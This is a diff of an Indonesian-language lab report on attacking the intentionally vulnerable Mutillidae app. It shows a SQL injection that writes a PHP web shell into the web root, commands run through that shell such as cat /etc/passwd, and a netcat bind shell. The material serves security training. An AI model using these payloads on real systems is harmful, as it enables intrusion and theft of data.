@@ -6,11 +6,11 @@
 
 ## Go To User Info Page
 1. Go to User Info
-   - OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info 
+   - **OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info** 
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/user_info.png "Home page")
 
 ## Inject Backdoor into User Info Page
-1. Inspect the Name Textbox with Firebug
+1. Inspect the Name Textbox
    - Klik kanan pada textbox **Name**, kemudian inspect element
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/inspect.png "Home page")
 2. Change Text Box Size
@@ -22,7 +22,7 @@
 	' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
    ```
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
-   - Klik tombol View Account Details
+   - Klik tombol **View Account Details**
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/union.png "Home page")
 4. Viewing the Results
 	- Scroll kebawah untuk melihat hasilnya
@@ -34,17 +34,23 @@
 	- Buka url berikut pada browser 
 	http://10.0.1.100/mutillidae/execute_command.php
 	- Ketikkan perintah berikut pada textbox:
-	  ```whoami; pwd```
+	```bash
+   whoami; pwd
+   ```
 	- Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/whoami.png "Home page")
 2. Who is Logged On
    - Ketikkan perintah berikut pada textbox:
-	 ```w```
+	```bash
+   w
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/w.png "Home page")
 3. Exploring /etc/passwd
    - Ketikkan perintah berikut pada textbox:
-	 ```cat /etc/passwd```
+	```bash
+   cat /etc/passwd
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_passwd.png "Home page")
 4. Network Reconnaissance
@@ -82,17 +88,17 @@
 2. Execute Netcat
    - Ketikkan perintah berikut pada textbox
    ```bash
-   mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+   mkfifo /tmp/pipe;sh /tmp/pipe | nc -lp 4444 -e /bin/bash> /tmp/pipe
    ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/mkfifo.png "Home page")
-3. On BackTrack, Start up a "another" terminal window
+3. Open another terminal window
 	- Buka terminal lain pada kali linux
 4. Connect to Netcat
    - Buka koneksi ke mutillidae menggunakan netcat
-   - Ketikkan perintah : `nc 10.0.1.100 4444`
-   - Ketikkan perintah : `hostname` untuk melihat hostname
-   - Ketikkan perintah : `whoami` untuk melihat user yang digunakan
+   - Ketikkan perintah : **`nc 10.0.1.100 4444`**
+   - Ketikkan perintah : **`hostname`** untuk melihat hostname
+   - Ketikkan perintah : **`whoami`** untuk melihat user yang digunakan
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/terminal_nc.png "Home page")
 5. View Credit Card Information
    - Pada terminal ketikkan printah-perintah berikut :
